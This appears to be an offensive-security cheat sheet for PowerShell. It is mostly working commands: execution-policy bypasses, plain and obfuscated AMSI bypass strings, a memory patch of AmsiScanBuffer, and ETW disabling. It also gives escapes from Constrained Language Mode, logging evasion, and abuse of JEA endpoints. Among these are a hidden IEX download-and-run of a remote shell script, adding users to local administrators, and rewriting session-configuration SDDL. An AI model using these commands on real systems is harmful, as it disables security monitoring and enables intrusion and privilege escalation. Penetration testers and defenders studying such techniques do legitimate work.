## PowerShell
- [General](#general)
- [Execution-policy](#execution-policy)
- [AMSI](#amsi)
- [ETW](#etw)
- [Constrained Language Mode](#constrained-language-mode)
- [Logging evasion](#logging-evasion)
- [Just Enough Admin (JEA)](#just-enough-admin-jea)

## General
### Powershell detections
- System-wide transcription
- Script Block logging 
- Module logging
- AntiMalware Scan Interface (AMSI)
- Constrained Language Mode (CLM) - Integrated with Applocker and WDAC (Device Guard)

#### Start 64 bit powershell
```
%SystemRoot%\sysnative\WindowsPowerShell\v1.0\powershell.exe
```

## Execution-policy
- It is not a security boundary.

#### Get Execution policy
```
Get-Executionpolicy
```

#### Bypass execution policy
- Not meant to be a security measure
```
powershell –executionpolicy bypass .\script.ps1
powershell –c <cmd>
powershell –enc
powershell.exe -executionpolicy bypass
```

## AMSI
- https://amsi.fail/
- Get an AMSI bypass string and then obfuscate [manually](#Obfuscation-techniques)

#### AMSI bypass string
```
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

#### AMSI bypass string obfuscated
```
S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
```

```
$v=[Ref].Assembly.GetType('System.Management.Automation.Am' + 'siUtils');
$v."Get`Fie`ld"('ams' + 'iInitFailed','NonPublic,Static')."Set`Val`ue"($null,$true);
```

#### AMSI bypass string 2 obfuscated
```
$MethodDefinition = @"
[DllImport(`"kernel32`",  EntryPoint="GetProcAddress")]
public static extern IntPtr GetProc(IntPtr hModule, string procName);

[DllImport(`"kernel32`")]
public static extern IntPtr GetModuleHandle(string lpModuleName);

[DllImport(`"kernel32`",EntryPoint="VirtualProtect" )]
public static extern bool Virtual(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
"@;
$Kernel32 = Add-Type -MemberDefinition $MethodDefinition -Name 'Kern' -NameSpace 'W' -PassThru;
$ABSD = 'Ams'+'iS'+'canBuffer';
$handle = [W.Kern]::GetModuleHandle('ams'+'i.dll');
[IntPtr]$BAddress = [W.Kern]::GetProc($handle, $ABSD);
[UInt32]$Size = 0x5;
[UInt32]$PFlag = 0x40;
[UInt32]$OFlag = 0;
[W.Kern]::Virtual($BAddress, $Size, $PFlag, [Ref]$OFlag);
$buf = [Byte[]]([UInt32]0xB8,[UInt32]0x57, [UInt32]0x00, [Uint32]0x07, [Uint32]0x80, [Uint32]0xC3);
[system.runtime.interopservices.marshal]::copy($buf, 0, $BAddress, 6);
```

## ETW
- Event Tracing for Windows
- Very effective way of hunting .NET
- Reflectivly modify the PowerShell process to prevent events being published. ETW feeds ALL of the other logs so this disabled everything!
- Also bypasses scriptblock logging

```
[Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static'); $EventProvider = New-Object System.Diagnostics.Eventing.EventProvider -ArgumentList @([Guid]::NewGuid()); $EtwProvider.SetValue($null, $EventProvider);
```

#### Obfusacted
```
[Reflection.Assembly]::"l`o`AdwIThPa`Rti`AlnamE"(('S'+'ystem'+'.C'+'ore'))."g`E`TTYPE"(('Sys'+'tem.Di'+'agno'+'stics.Event'+'i'+'ng.EventProv'+'i'+'der'))."gET`FI`eLd"(('m'+'_'+'enabled'),('NonP'+'ubl'+'ic'+',Instance'))."seTVa`l`Ue"([Ref]."a`sSem`BlY"."gE`T`TyPE"(('Sys'+'tem'+'.Mana'+'ge'+'ment.Aut'+'o'+'mation.Tracing.'+'PSEtwLo'+'g'+'Pro'+'vi'+'der'))."gEtFIe`Ld"(('e'+'tw'+'Provid'+'er'),('N'+'o'+'nPu'+'b'+'lic,Static'))."gE`Tva`lUe"($null),0)
```

## Constrained Language Mode
#### Check the language mode
```
$ExecutionContext.SessionState.LanguageMode
```

### Escapes for Constrained Language Mode
#### Launch Powershell Version 2
```
Powershell.exe -Version 2
```

#### Overwrite PSLockdownPolicy variable
- If CLM is not implemented correctly and is using __PSLockdownPolicy

#### Check the PSLockdownPolicy value
- Value 4 is enabled
- Value 8 is disabled
```
(Get-ItemProperty 'hklm:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -name "__PSLockdownPolicy").__PSLockDownPolicy
```

#### Set lockdown policy to 8 and check language mode
- https://github.com/Metoraf007/Public_PowerShell/blob/master/Bypass_ConstrainedLang.ps1
```
Set-ItemProperty 'hklm:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -name "__PSLockdownPolicy" -Value 8
powershell.exe
$ExecutionContext.SessionState.LanguageMode
```

### PowerShx
- https://github.com/iomoath/PowerShx
```
rundll32 PowerShx.dll,main -i 
PowerShx.exe -i  
```

### PowerShdll Run PowerShell with dlls only.
- https://github.com/p3nt4/PowerShdll
- Does not require access to powershell.exe as it uses powershell automation dlls.
```
rundll32 PowerShdll,main -i
```

#### Download files with certutil
- You can not use iwr but you can use certutil in constrained language mode
```
certutil -urlcache -split -f <URL>
```

#### Execute scripts
- It is possible to execute scripts on the filesystem but you can't load them!
- If applocker is there enumerate it to find a directory that lets you execute scripts in

## Logging evasion
#### Invisi-shell
- Bypasses all logging
- https://github.com/OmerYa/Invisi-Shell
- Type exit from the new PowerShell session to complete the clean-up.

#### With admin privileges
```
./RunWithPathAsAdmin.bat 
```

#### With non-admin privileges:
```
RunWithRegistryNonAdmin.bat
```

#### Script Block logging bypass
- Bypass [ETW](#ETW)

##### Winrs
- Use Winrs instead of PSRemoting to evade System-wide-transcript and deep script block logging
```
winrs -remote:server1 -u:<COMPUTERNAME>\<USER> -p:<PASS> hostname
```

## Just Enough Admin (JEA)
- Defines allowed cmdledt and commands that are allowed by defining role capabilities.

#### Connect with JEA endpoint
- Use `DOMAIN\USER` format
```
$creds = get-credential
$sess = New-PSSession -ComputerName <FQDN> -ConfigurationName <JEA ENDPOINT CONF NAME> -Credential $creds
```

#### Get the PSSession configurations (and JEA)
```
Get-PSSessionconfiguration
```

#### Get PSSession capabilities
```
Get-PSSessionCapability -ConfigurationName <NAME> -Username <DOMAIN>\<USERNAME>
```

### Abuse JEA
- Only when its misconfigured and allows dangerous commands like net.exe or cmdlets like Start-Process or Start-Service.
- Allows the use of wildcard.
- Check which commands are allowed to run and google for abuses
- https://www.triplesec.info/slides/3c567aac7cf04f8646bf126423393434.pdf
```
Get-Command

# Abuse example
Start-Process cmd.exe calc.exe
```

#### Abuse - Creating functions
- If JEA enpoint is running in Constrained Language Mode instead of NoLanguage it is possible to create your own functions!
- Creates a function with the name `gl` and executes it.
- Shortcut would be `${ <COMMAND>}`
```
function gl {Get-Location}; gl

function gl {whoami}; gl

function gl {powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://<IP>/shell.ps1'))"}; gl
```

#### Abuse - Grant a user to admin
```
Add-ADGroupMember, Add-LocalGroupMember, net.exe, dsadd.exe
```

#### Abuse - Running arbritary code
```
Start-Process, New-Service, Invoke-Item, Invoke-WmiMethod, Invoke-Command,
New-ScheduledTask, Register-ScheduledJob

Invoke-Command -ScriptBlock {net localgroup administrators <USER> /add}
```

### Abuse - Set-PSSessionConfiguration
- From https://github.com/samratashok/RACE/blob/master/RACE.ps1
- After finding a profile to edit, can also edit `microsoft.powershell` which is the normal remoting endpoint!

#### Connect and check the config
```
$sess = New-PSSession -ComputerName <FQDN> -Credential $creds -ConfigurationName <ENDPOINT>
Enter-PSSession $sess
Get-PSSessionConfiguration
```

#### Get original SDDL
```
$existingSDDL = (Get-PSSessionConfiguration -Name "<PROFILE>" -Verbose:$false).SecurityDescriptorSDDL
```

#### Get SID  for new user to add
```
$SID = (Get-DomainUser <USER>).Objectsid
```

#### Create new SDDL with a new USER SID
```
$isContainer = $false  
$isDS = $false  
$SecurityDescriptor = New-Object -TypeName Security.AccessControl.CommonSecurityDescriptor -ArgumentList $isContainer,$isDS, $existingSDDL
$accessType = "Allow"  
$accessMask = 268435456  
$inheritanceFlags = "none"  
$propagationFlags = "none"  
$SecurityDescriptor.DiscretionaryAcl.AddAccess($accessType,$SID,$accessMask,$inheritanceFlags,$propagationFlags) | Out-Null
$newSDDL = $SecurityDescriptor.GetSddlForm("All")
$newSDDL
```

#### Change the config
````
Set-PSSessionConfiguration -name "<PROFILE>" -SecurityDescriptorSddl "<SDDL>" -force -Confirm:$false
````

#### Reconnect and check the config
```
$sess = New-PSSession -ComputerName <FQDN> -Credential $creds -ConfigurationName <ENDPOINT>
Enter-PSSession $sess
Get-PSSessionConfiguration
```

#### Connect to reconfigured new endpoint
```
$sess2 = New-PSSession -ComputerName <FQDN> -Credential $creds2 -ConfigurationName <RECONFIGURED ENDPOINT>
Enter-PSSession $sess
Get-PSSessionConfiguration
```
